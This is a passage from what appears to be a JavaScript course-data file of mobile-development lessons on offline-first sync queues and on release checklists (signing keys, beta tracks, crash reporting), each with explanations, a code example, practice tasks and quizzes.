      { task: "Build a note screen that keeps its draft after you force-quit the app and reopen it.", hint: "Test by backgrounding the app, then killing it from the app switcher." },
      { task: "List what your app does when a phone call arrives mid-task. Fix the first problem you find.", hint: "Check timers, audio and any in-progress form." },
    ],
    quiz: [
      { q: "When should you persist unsaved user input?", options: ["Only when the user taps Save", "When the app moves to the background", "Only on logout", "Never, the OS does it"], answer: 1, why: "The app may be terminated without further notice once backgrounded." },
      { q: "A user switches apps and returns hours later to a blank form. What went wrong?", options: ["The device is old", "State was not saved and restored across termination", "The network failed", "The screen rotated"], answer: 1, why: "The OS may have terminated the app, so state must be restored from storage." },
      { q: "Why release heavy resources when backgrounded?", options: ["To look professional", "The OS may terminate memory-hungry background apps", "It speeds up the UI", "Stores require it"], answer: 1, why: "Lower memory use makes it less likely you are killed and keeps the device responsive." },
    ],
    pitfalls: ["Assuming the app stays in memory", "Saving only on a manual button press", "Starting network work that cannot survive suspension"],
  },
  {
    id: "mob-offline",
    familyId: "mobile-development",
    module: "Offline-first and data",
    title: "Offline-first: queue, retry, reconcile",
    minutes: 35,
    objectives: ["Write to local storage first, then sync", "Queue operations with retry and backoff", "Handle conflicts deliberately"],
    explain: [
      "Networks on phones are slow, flaky or absent in lifts, trains and basements. An offline-first app treats the local database as the source the interface reads from and writes to, and syncs with the server in the background. The user sees instant responses and never loses work when the signal drops.",
      "To sync safely, record each change as an operation in a persistent queue: create, update or delete with a unique id and timestamp. A background process sends queued operations when the network is available, retrying failures with exponential backoff and a cap. Operations should be idempotent, meaning sending the same one twice has the same effect as once, so retries cannot create duplicates. A client-generated id for each new record makes that possible.",
      "Conflicts occur when the same record changes in two places. Decide a rule: last write wins, merge field by field, or ask the user. Last write wins is simple but can lose edits, so use it only when that is acceptable. Show sync status to users so they trust the app, for example a small indicator for pending changes.",
      "Offline behaviour needs a good interface as well as good plumbing. Show clearly when the device is offline, mark items that have not yet synced, and explain failures in plain language with a retry option. Test with the network deliberately broken: airplane mode, a very slow connection, and a connection that drops halfway through a request. Many offline bugs only appear at those moments, and users meet them far more often than developers expect.",
    ],
    keyIdeas: ["Read and write locally; sync in the background", "A persistent operation queue with backoff", "Idempotent operations using client-generated ids", "Choose a conflict policy and show sync status"],
    example: {
      title: "A minimal sync queue",
      lang: "javascript",
      code: `// Each change is stored as an operation before anything touches the network
async function addTodo(db, text) {
  const id = crypto.randomUUID();                 // client-generated id
  await db.todos.put({ id, text, done: false, synced: false });
  await db.queue.put({ opId: crypto.randomUUID(), type: "create", id, text, attempts: 0 });
  syncSoon();
}

async function flushQueue(db, api) {
  const ops = await db.queue.orderBy("createdAt").toArray();
  for (const op of ops) {
    try {
      await api.post("/todos", { id: op.id, text: op.text, opId: op.opId }); // server ignores a repeated opId
      await db.queue.delete(op.opId);
      await db.todos.update(op.id, { synced: true });
    } catch (err) {
      const attempts = op.attempts + 1;
      const delay = Math.min(60000, 1000 * 2 ** attempts);   // exponential backoff, capped
      await db.queue.update(op.opId, { attempts, retryAt: Date.now() + delay });
      break;                                                  // preserve order, try again later
    }
  }
}`,
      walkthrough: ["The UI updates immediately from local data, with synced set to false.", "The operation carries a unique id, so the server can ignore a duplicate retry.", "Failures back off exponentially, and the loop stops to preserve order."],
    },
    practice: [
      { task: "Turn on airplane mode, create three items in your app, then reconnect. Does each appear exactly once on the server?", hint: "If you see duplicates, add client-generated ids and server-side deduplication." },
      { task: "Write the conflict rule for an editable profile: what happens if it changes on two devices?", hint: "Merging per field is usually friendlier than last write wins." },
    ],
    quiz: [
      { q: "Why generate record ids on the client in an offline-first app?", options: ["It is required by the OS", "Records can be created offline and retried without duplicates", "Servers cannot make ids", "It reduces storage"], answer: 1, why: "The id exists before the server sees the record, so a retry can be recognised as the same operation." },
      { q: "What does idempotent mean for a sync operation?", options: ["It never fails", "Applying it twice has the same effect as once", "It runs only offline", "It is encrypted"], answer: 1, why: "Retries are inevitable, so repeating an operation must be harmless." },
      { q: "Why use exponential backoff?", options: ["To slow users down", "To avoid hammering a struggling server and drain less battery", "To pass store review", "To sort the queue"], answer: 1, why: "Increasing delays between retries reduces load and battery use while still recovering." },
    ],
    pitfalls: ["Writing directly to the server and showing a spinner", "Retrying forever at full speed", "Ignoring conflicts until users report lost edits"],
  },
  {
    id: "mob-release",
    familyId: "mobile-development",
    module: "Shipping to the stores",
    title: "Release checklist: signing, tracks and crash reporting",
    minutes: 30,
    objectives: ["Explain code signing and why keys must be protected", "Use beta tracks to release in stages", "Wire up crash reporting and a release health check"],
    explain: [
      "Mobile releases are slower to fix than the web because users must update. That makes preparation important. Stores require your app to be cryptographically signed so devices can verify that updates come from you. Protect the signing keys and certificates: if you lose an Android upload key or a distribution certificate you can lose the ability to ship updates normally, and if one leaks, someone else could impersonate you. Use the store's managed signing where available and keep backups in a secure vault.",
      "Release in stages. Use internal testing, then beta tracks such as TestFlight on iOS and the internal, closed or open testing tracks on Google Play, then a staged rollout to a small percentage of users before everyone. Each stage catches a different class of problem: your team finds obvious crashes, testers find device-specific issues, and a staged rollout limits the blast radius of a bug you missed.",
      "Instrument before you ship. Add crash reporting with symbol or mapping files uploaded so stack traces are readable, track the crash-free session rate for each version, and decide in advance what level makes you halt a rollout. Prepare store assets: a privacy policy, accurate data-use declarations, screenshots and release notes. Many rejections are about policy details, not code.",
    ],
    keyIdeas: ["Protect signing keys; use managed signing and backups", "Release through internal, beta and staged rollout", "Crash reporting needs uploaded symbols to be useful", "Policy and privacy details cause many rejections"],
    example: {
      title: "A pre-release checklist",
      lang: "text",
      code: `Build
[ ] Version name and build number incremented
[ ] Release build signed with the production key (stored in a vault)
[ ] Debug logging and test endpoints disabled
[ ] Minification mapping / dSYM files uploaded to the crash reporter

Quality
[ ] Smoke test on one low-end and one recent device, small and large screens
[ ] Airplane mode and slow-network behaviour checked
[ ] Upgrade path tested from the previous version (data migration)

Store
[ ] Privacy policy URL live and matches actual data collection
[ ] Data safety / privacy nutrition labels accurate
[ ] Screenshots, description and release notes ready

Rollout
[ ] Internal testers -> beta testers -> 5% staged rollout -> 20% -> 100%
[ ] Halt rule defined: e.g. crash-free sessions below 99.5% or a spike in a critical error
[ ] Rollback or hotfix plan agreed, owner named`,
      walkthrough: ["The build items prevent shipping debug code or unreadable crash reports.", "Quality items cover the conditions where mobile apps most often fail.", "The rollout stages and halt rule limit damage if something slips through."],
    },
    practice: [
      { task: "Publish a test build to a beta track and collect feedback from at least five testers.", hint: "Give testers a short checklist, not just 'try it'." },
      { task: "Trigger a deliberate crash in a debug build and confirm the report shows a readable stack trace.", hint: "If it is obfuscated, the mapping or symbol upload is missing." },
    ],
    quiz: [
      { q: "Why is a staged rollout useful?", options: ["It speeds up review", "It limits how many users a missed bug can affect", "It removes the need for testing", "It avoids signing"], answer: 1, why: "A small initial percentage lets you watch crash and error rates before everyone gets the update." },
      { q: "A crash report shows only obfuscated names. What is probably missing?", options: ["A privacy policy", "Uploaded mapping or symbol files", "A newer phone", "A staged rollout"], answer: 1, why: "Symbol or mapping files translate obfuscated frames back into readable code locations." },
      { q: "Why guard signing keys carefully?", options: ["They are large files", "Losing them blocks updates and a leak allows impersonation", "Stores audit them weekly", "They expire daily"], answer: 1, why: "They prove updates come from you. Treat them like production secrets." },
    ],
    pitfalls: ["Shipping on the last day with no beta feedback", "Inaccurate privacy declarations", "No agreed rule for halting a rollout"],
  },
];
